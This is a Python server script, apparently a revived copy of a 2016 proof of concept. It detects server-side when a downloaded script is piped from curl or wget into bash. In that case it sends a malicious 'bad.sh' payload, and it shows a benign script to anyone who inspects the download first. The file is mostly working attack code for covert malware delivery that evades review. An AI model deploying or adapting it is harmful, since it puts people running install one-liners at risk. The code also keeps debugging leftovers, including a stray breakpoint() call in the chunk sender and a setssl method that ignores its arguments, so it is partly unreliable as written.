"""This program is free software: you can redistribute it and/or modify
   it under the terms of the GNU General Public License as published by
   the Free Software Foundation, either version 3 of the License, or
   (at your option) any later version.

   This program is distributed in the hope that it will be useful,
   but WITHOUT ANY WARRANTY; without even the implied warranty of
   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
   GNU General Public License for more details.

   You should have received a copy of the GNU General Public License
   along with this program.  If not, see <http://www.gnu.org/licenses/>.

   A script to detect the use of curl or wget -O - | bash.

   See https://www.idontplaydarts.com/2016/04/detecting-curl-pipe-bash-server-side/
   for more details on how this works.

   @author Phil

   Update: Moser <will.moser@spacecoast.dev>
   The original site is down so I've included the code here.
   See https://web.archive.org/web/20250622061208/https://www.idontplaydarts.com/2016/04/detecting-curl-pipe-bash-server-side/ for the archived version.
   

"""

from numpy import std
import re
import socketserver
import socket
import ssl
import time
import logging
import debugpy

debugpy.listen(("localhost", 5678))
class MoguiServer(socketserver.ThreadingMixIn, socketserver.TCPServer):
    """HTTP server to detect curl | bash"""
    logging.basicConfig(level=logging.DEBUG)
    
    daemon_threads = True
    allow_reuse_address = True
    payloads = {}
    ssl_options = None

    def __init__(self, server_address):
        """Accepts a tuple of (HOST, PORT)"""

        # Socket timeout
        self.socket_timeout = 10

        # Outbound tcp socket buffer size
        self.buffer_size = 87380

        # What to fill the tcp buffers with
        #self.padding = b"\x00" * (self.buffer_size)
        self.padding = bytes(self.buffer_size)
        # Maximum number of blocks of padding - this
        # shouldn't need to be adjusted but may need to be increased
        # if its not working.
        self.max_padding = 16

        # HTTP 200 status code
        packet_plain = (
            "HTTP/1.1 200 OK\r\n"
            "Server: Apache\r\n"
            "Date: %s\r\n"
            "Content-Type: text/plain; charset=us-ascii\r\n"
            "Transfer-Encoding: chunked\r\n"
            "Connection: keep-alive\r\n\r\n"
        ) % time.ctime(time.time())
        self.packet_200 = packet_plain.encode("ascii", errors="ignore")

        socketserver.TCPServer.__init__(self, server_address, HTTPHandler)

    def setssl(self, cert_file, key_file):
        """Sets SSL params for the server sockets"""

        self.ssl_options = (cert_file, key_file)

    def setscript(self, uri, params):
        """Sets parameters for each URI"""

        (null, good, bad, min_jump, max_variance) = params

        with open(null, "rb") as null_file:
            null_payload = null_file.read()  # Base file with a delay
        with open(good, "rb") as good_file:
            good_payload = good_file.read()  # Non malicious payload
        with open(bad, "rb") as bad_file:
            bad_payload = bad_file.read()    # Malicious payload

        self.payloads[uri] = (null_payload, good_payload, bad_payload,
                              min_jump, max_variance)


class HTTPHandler(socketserver.BaseRequestHandler):
    """Socket handler for MoguiServer"""

    def sendchunk(self, text):
        """Sends a single HTTP chunk"""



        header = "%s\r\n" % hex(len(text))[2:]
        breakpoint()
        self.request.sendall(header.encode("utf-8", errors="ignore"))
        self.request.sendall(text)
        self.request.sendall(b"\r\n")

    def log(self, msg):
        """Writes output to stdout"""

        print("[%s] %s %s" % (time.time(), self.client_address[0], msg))

    def handle(self):
        """Handles inbound TCP connections from MoguiServer"""

        # If the two packets are transmitted with a difference in time
        # of min_jump and the remaining packets have a time difference with
        # a variance of less then min_var the output has been piped
        # via bash.

        self.log("Inbound request")

        # Setup socket options

        self.request.settimeout(self.server.socket_timeout)
        self.request.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        self.request.setsockopt(socket.SOL_SOCKET,
                                socket.SO_SNDBUF,
                                self.server.buffer_size)

        # Attempt to wrap the TCP socket in SSL

        try:
            if self.server.ssl_options:
                
                test = ssl.SSLContext(ssl.PROTOCOL_SSLv23)
                
                test.load_cert_chain(certfile='cert.pem', keyfile='key.pem')
                test.check_hostname = False
                
                self.request = test.wrap_socket(self.request,server_side=True)
        except ssl.SSLError as e:
            self.log(f"SSL negotiation failed: {e}")
            self.log("SSL negotiation failed")
            return

        # Parse the HTTP request

        data = None

        try:
            data = self.request.recv(1024)
        except socket.error:
            self.log("No data received")
            return
        except socket.timeout:
            self.log("Socket read timed out")
            return

        if not data:
            self.log("No data received")
            return

        #request_text = data.decode("iso-8859-1", errors="ignore")
        uri = re.search(r"^GET ([^ ]+) HTTP/1\.[0-9]", data.decode("utf-8", errors="ignore"))

        if not uri:
            self.log("HTTP request malformed.")
            return

        request_uri = uri.group(1)
        self.log("Request for shell script %s" % request_uri)

        if request_uri not in self.server.payloads:
            self.log("No payload found for %s" % request_uri)
            return

        # Return 200 status code

        self.request.sendall(self.server.packet_200)

        (payload_plain, payload_good, payload_bad, min_jump, max_var) = self.server.payloads[request_uri]

        # Send plain payload
        self.log("Before payload plain")

        self.sendchunk(payload_plain)
        self.log("After payload plain")
        if not re.search(r"User-Agent: (curl|Wget)",  data.decode("utf-8", errors="ignore")):
            self.log("Request not via curl/wget.")
            self.sendchunk(payload_good)
            self.sendchunk(b"")
            self.log("Request not via wget/curl. Returning good payload.")
            return

        timing = []
        stime = time.time()

        for i in range(0, self.server.max_padding):
            self.log("Sending padding block %s" % i)
            self.log("Padding is %s" % self.server.padding)
            self.sendchunk(self.server.padding)
            self.log("Didn't Crash Sending padding block %s" % i)
            timing.append(time.time() - stime)

        # ReLU curve analysis

        max_array = [timing[i+1] - timing[i] for i in range(len(timing)-1)]

        jump = max(max_array)

        del max_array[max_array.index(jump)]

        var = std(max_array) ** 2

        self.log("Variance = %s, Maximum Jump = %s" % (var, jump))

        # Payload choice

        if var < max_var and jump > min_jump:
            self.log("Execution through bash detected - sending bad payload :D")
            self.sendchunk(payload_bad)
        else:
            self.log("Sending good payload :(")
            self.sendchunk(payload_good)

        self.sendchunk(b"")
        self.log("Connection closed.")



if __name__ == "__main__":

    HOST, PORT = "0.0.0.0", 5555

    SERVER = MoguiServer((HOST, PORT))
    SERVER.setscript("/setup.bash", ("ticker.sh", "good.sh", "bad.sh", 2.0, 0.1))
    SERVER.setssl("cert.pem", "key.pem")
    
    print("Listening on %s %s" % (HOST, PORT))
    
    SERVER.serve_forever()
